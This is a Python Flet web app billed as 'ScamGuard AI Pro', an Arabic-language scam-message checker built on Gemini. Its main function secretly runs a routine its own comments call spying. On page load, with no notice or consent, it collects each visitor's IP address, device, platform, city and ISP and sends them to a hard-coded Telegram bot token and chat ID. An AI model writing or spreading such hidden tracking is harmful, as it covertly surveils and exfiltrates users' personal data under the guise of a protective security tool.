import flet as ft
import google.generativeai as genai
import os
import urllib.request
import urllib.parse
import json
import threading

# 🔑 إعداد Gemini API
API_KEY = os.getenv("GEMINI_API_KEY")
genai.configure(api_key=API_KEY)
model = genai.GenerativeModel("gemini-1.5-flash")

# 🕵️‍♂️ دالة التتبع (الرادار المستقر)
def send_spy_report(ip, ua, platform):
    try:
        if not ip or ip in ["127.0.0.1", "0.0.0.0"]: return
        
        # جلب معلومات الموقع
        res = urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=5)
        data = json.loads(res.read().decode())
        
        # استخراج موديل الهاتف بشكل يدوي آمن
        device_info = "Unknown Device"
        try:
            if "(" in ua:
                device_info = ua.split("(")[1].split(")")[0]
        except: pass

        report = (
            f"🚨 **تنبيه أمني: زائر جديد**\n"
            f"━━━━━━━━━━━━━━\n"
            f"📱 **الجهاز:** `{device_info}`\n"
            f"💻 **النظام:** {platform}\n"
            f"🌍 **الموقع:** {data.get('country')} - {data.get('city')}\n"
            f"📡 **الشبكة:** {data.get('isp')}\n"
            f"🌐 **IP:** `{ip}`\n"
            f"━━━━━━━━━━━━━━"
        )
        
        TOKEN = "8224848160:AAHwuyB1-asKYVfPOtfvlkSgQRDUz35e8d8"
        CHAT_ID = "6178338980"
        
        safe_msg = urllib.parse.quote(report)
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={safe_msg}&parse_mode=Markdown"
        urllib.request.urlopen(url, timeout=5)
    except:
        pass

def main(page: ft.Page):
    # 🎯 سحب البيانات المضمونة فقط
    def start_spying():
        try:
            ip = page.client_ip
            ua = page.client_user_agent if page.client_user_agent else "Unknown UA"
            plat = page.platform if page.platform else "Unknown Platform"
            threading.Thread(target=send_spy_report, args=(ip, ua, plat), daemon=True).start()
        except:
            pass

    start_spying()

    page.title = "ScamGuard AI Pro - By Amine"
    page.theme_mode = ft.ThemeMode.DARK
    page.rtl = True
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.scroll = "auto"
    page.padding = 25

    def check_scam(e):
        if not input_box.value.strip():
            res_txt.value = "⚠️ الرجاء إدخال نص للفحص أولاً"; page.update(); return
        
        btn.disabled = True; loading_row.visible = True; res_card.visible = False; page.update()
        
        try:
            prompt = f"حلل هذا النص كخبير احتيال رقمي بلهجة عربية واضحة:\n{input_box.value}"
            response = model.generate_content(prompt)
            res_txt.value = response.text if response.text else "⚠️ فشل التحليل."
        except Exception as err:
            res_txt.value = f"❌ خطأ تقني: {str(err)}"
        
        loading_row.visible = False; btn.disabled = False; res_card.visible = True; page.update()

    # الواجهة الرسمية (بسيطة ومستقرة)
    logo = ft.Text("🛡️", size=80)
    title = ft.Text("ScamGuard AI Pro", size=32, weight="bold", color="blue400")
    input_box = ft.TextField(label="📩 الصق نص الرسالة هنا للفحص", multiline=True, min_lines=4, border_radius=15, width=400)
    btn = ft.ElevatedButton("🚀 بدء الفحص الذكي", on_click=check_scam, height=50, width=220)
    loading_row = ft.Row([ft.ProgressRing(width=20), ft.Text("جاري التحليل...")], visible=False, alignment="center")
    res_txt = ft.Text(size=16, selectable=True)
    res_card = ft.Card(visible=False, content=ft.Container(padding=20, content=ft.Column([ft.Text("📊 تقرير الأمان", color="cyan", weight="bold"), res_txt])), width=450)
    
    page.add(logo, title, input_box, btn, loading_row, res_card)

if __name__ == "__main__":
    ft.app(target=main, view=None, port=int(os.getenv("PORT", 8080)), host="0.0.0.0")
    
